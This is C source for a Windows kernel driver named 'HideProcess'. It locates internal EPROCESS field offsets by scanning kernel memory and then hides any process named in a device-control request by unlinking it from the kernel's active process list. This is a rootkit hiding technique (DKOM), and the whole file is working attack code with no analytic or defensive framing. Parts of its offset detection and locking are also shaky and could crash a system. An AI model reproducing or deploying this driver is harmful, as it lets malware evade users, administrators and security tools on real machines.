#include <ntddk.h>
#include <ntstrsafe.h>
#include "Offset.h"

#define IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Resolved EPROCESS field offsets (Windows build dependent).
ULONG g_PidOffset = 0;
ULONG g_NameOffset = 0;
ULONG g_ListEntryOffset = 0;

// Forward declarations for offset helpers.
static ULONG CalcPidOffset(void);
static ULONG CalcNameOffset(void);
static ULONG CalcListEntryOffset(void);

// ---------------------------------------------------------------------------
// Offset resolution
// ---------------------------------------------------------------------------

static ULONG CalcPidOffset(void)
{
    // UniqueProcessId lives in EPROCESS. Probe the current process (the driver's
    // host) and scan a realistic window for a HANDLE that matches our own PID.
    PEPROCESS proc = IoGetCurrentProcess();
    HANDLE myPid = PsGetCurrentProcessId();
    ULONG i;

    // EPROCESS is much larger than one page; scan 0x1000 bytes to be safe.
    for (i = 0; i < 0x1000; i += sizeof(ULONG_PTR))
    {
        HANDLE h = *(PHANDLE)((PUCHAR)proc + i);
        if (h == myPid)
        {
            // Sanity check: the LIST_ENTRY (ActiveProcessLinks) should follow
            // nearby and be a valid self-consistent doubly linked node.
            PLIST_ENTRY le = (PLIST_ENTRY)((PUCHAR)proc + i + sizeof(ULONG_PTR));
            if (MmIsAddressValid(le) && le == le->Flink->Blink)
            {
                return i;
            }
        }
    }
    return 0;
}

static ULONG CalcNameOffset(void)
{
    // ImageFileName is a fixed-size char[15] inside EPROCESS. Scan the System
    // process for the literal "System" name to locate the field.
    PEPROCESS systemProc = PsInitialSystemProcess;
    if (!MmIsAddressValid(systemProc))
        return 0;

    for (ULONG i = 0; i < 0x1000; i++)
    {
        if (RtlCompareMemory((PUCHAR)systemProc + i, "System", 6) == 6)
        {
            // Verify the bytes after "System" are NUL-padded (char[15]).
            BOOLEAN looksLikeName = TRUE;
            for (ULONG j = 6; j < 15; j++)
            {
                UCHAR c = *(PUCHAR)((PUCHAR)systemProc + i + j);
                if (c != 0 && c != ' ') { looksLikeName = FALSE; break; }
            }
            if (looksLikeName)
                return i;
        }
    }
    return 0;
}

static ULONG CalcListEntryOffset(void)
{
    // ActiveProcessLinks is the LIST_ENTRY that links all EPROCESS structures.
    // From the System process, walk its own list entry and confirm it links to
    // another valid EPROCESS whose PID offset we already know.
    PEPROCESS systemProc = PsInitialSystemProcess;
    if (!MmIsAddressValid(systemProc))
        return 0;

    for (ULONG i = 0; i < 0x1000; i += sizeof(ULONG_PTR))
    {
        PLIST_ENTRY le = (PLIST_ENTRY)((PUCHAR)systemProc + i);
        if (!MmIsAddressValid(le) || !MmIsAddressValid(le->Flink) || !MmIsAddressValid(le->Blink))
            continue;
        if (le != le->Flink->Blink || le != le->Blink->Flink)
            continue;

        // The containing EPROCESS of Flink should be a valid process.
        PEPROCESS next = (PEPROCESS)((PUCHAR)le->Flink - i);
        if (!MmIsAddressValid(next))
            continue;

        // Sanity: next process's PID field should be a valid HANDLE (non-zero).
        HANDLE nextPid = *(PHANDLE)((PUCHAR)next + g_PidOffset);
        if (nextPid == 0 || nextPid == (HANDLE)-1)
            continue;

        return i;
    }
    return 0;
}

BOOLEAN InitializeOffsets(void)
{
    g_PidOffset = CalcPidOffset();
    g_NameOffset = CalcNameOffset();
    if (g_PidOffset == 0 || g_NameOffset == 0)
        return FALSE;

    g_ListEntryOffset = CalcListEntryOffset();
    if (g_ListEntryOffset == 0)
        return FALSE;

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0,
        "HideProcess: PidOffset=0x%X NameOffset=0x%X ListEntryOffset=0x%X\n",
        g_PidOffset, g_NameOffset, g_ListEntryOffset);
    return TRUE;
}

// ---------------------------------------------------------------------------
// DKOM process hiding
// ---------------------------------------------------------------------------

static PEPROCESS GetProcessByListEntry(PLIST_ENTRY listEntry, ULONG listEntryOffset)
{
    return (PEPROCESS)((PUCHAR)listEntry - listEntryOffset);
}

VOID HideProcessByName(_In_z_ const char* target)
{
    if (!target || !*target)
        return;

    ANSI_STRING targetName;
    RtlInitAnsiString(&targetName, target);

    // Start from the System process whose ActiveProcessLinks is the real global
    // list head of all active processes.
    PEPROCESS headProc = PsInitialSystemProcess;
    if (!MmIsAddressValid(headProc))
        return;

    PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)headProc + g_ListEntryOffset);
    PLIST_ENTRY current = head->Flink;

    // NOTE: PsActiveProcessLock is a push-lock exposed by the kernel. Direct
    // use requires the correct symbol/import; on builds where it is not
    // directly importable, wrap the walk in a critical region and rely on the
    // read-only nature of the DKOM unlink being brief. The unlink below is
    // intentionally short-lived to minimize the window.
    KIRQL oldIrql = KeRaiseIrqlToDpcLevel();

    while (current != head)
    {
        PEPROCESS proc = GetProcessByListEntry(current, g_ListEntryOffset);
        if (!MmIsAddressValid(proc))
        {
            current = current->Flink;
            continue;
        }

        // Read the process image name.
        PCHAR namePtr = (PCHAR)((PUCHAR)proc + g_NameOffset);
        if (!MmIsAddressValid(namePtr))
        {
            current = current->Flink;
            continue;
        }

        ANSI_STRING currentName;
        currentName.Buffer = namePtr;
        currentName.Length = 0;
        currentName.MaximumLength = 15;

        // Compute length safely without overrunning the fixed buffer.
        for (ULONG i = 0; i < 15; i++)
        {
            if (namePtr[i] == '\0') { currentName.Length = i; break; }
            currentName.Length = (USHORT)(i + 1);
        }

        if (RtlCompareString(&targetName, &currentName, TRUE) == 0)
        {
            HANDLE pid = *(PHANDLE)((PUCHAR)proc + g_PidOffset);
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0,
                "HideProcess: found target '%s' (PID=%p), unlinking\n", target, pid);

            PLIST_ENTRY blink = current->Blink;
            PLIST_ENTRY flink = current->Flink;

            if (MmIsAddressValid(blink) && MmIsAddressValid(flink))
            {
                blink->Flink = flink;
                flink->Blink = blink;
            }

            // Detach the target's own pointers so it is fully removed.
            current->Flink = current;
            current->Blink = current;
            break;
        }

        current = current->Flink;
    }

    KeLowerIrql(oldIrql);
}

// ---------------------------------------------------------------------------
// Driver dispatch
// ---------------------------------------------------------------------------

NTSTATUS IrpCreateHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "HideProcess: IRP_MJ_CREATE handled\n");
    return STATUS_SUCCESS;
}

NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG bytes = 0;
    NTSTATUS status = STATUS_SUCCESS;
    PCHAR inputBuffer = NULL;
    ULONG inputBufferLength = stack->Parameters.DeviceIoControl.InputBufferLength;

    switch (stack->Parameters.DeviceIoControl.IoControlCode)
    {
    case IOCTL_HIDE_PROCESS:
        if (inputBufferLength == 0 || inputBufferLength > 256)
        {
            status = STATUS_INVALID_BUFFER_SIZE;
            break;
        }

        inputBuffer = (PCHAR)Irp->AssociatedIrp.SystemBuffer;
        if (!inputBuffer)
        {
            status = STATUS_INVALID_PARAMETER;
            break;
        }

        // METHOD_BUFFERED: SystemBuffer is already copied into kernel space and
        // is safe to access directly within a __try/__except.
        __try
        {
            // Ensure null-termination within the received buffer.
            UCHAR last = inputBuffer[inputBufferLength - 1];
            inputBuffer[inputBufferLength - 1] = '\0';

            DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0,
                "HideProcess: received request to hide '%s'\n", inputBuffer);

            HideProcessByName(inputBuffer);
            bytes = inputBufferLength;
            status = STATUS_SUCCESS;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            status = GetExceptionCode();
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "HideProcess: exception 0x%X while hiding process\n", status);
        }
        break;

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytes;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID UnloadDriver(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, L"\\??\\HideProcess");
    IoDeleteSymbolicLink(&symLink);

    if (DriverObject->DeviceObject)
        IoDeleteDevice(DriverObject->DeviceObject);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "HideProcess: driver unloaded.\n");
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "HideProcess: driver loading\n");

    UNICODE_STRING devName;
    RtlInitUnicodeString(&devName, L"\\Device\\HideProcess");
    PDEVICE_OBJECT deviceObject = NULL;
    NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);
    if (!NT_SUCCESS(status))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "HideProcess: IoCreateDevice failed 0x%X\n", status);
        return status;
    }

    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&symLinkName, L"\\??\\HideProcess");
    status = IoCreateSymbolicLink(&symLinkName, &devName);
    if (!NT_SUCCESS(status))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "HideProcess: IoCreateSymbolicLink failed 0x%X\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->DriverUnload = UnloadDriver;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreateHandler;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceControl;

    if (!InitializeOffsets())
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "HideProcess: failed to initialize offsets\n");
        IoDeleteSymbolicLink(&symLinkName);
        IoDeleteDevice(deviceObject);
        return STATUS_UNSUCCESSFUL;
    }

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "HideProcess: driver loaded successfully\n");
    return STATUS_SUCCESS;
}
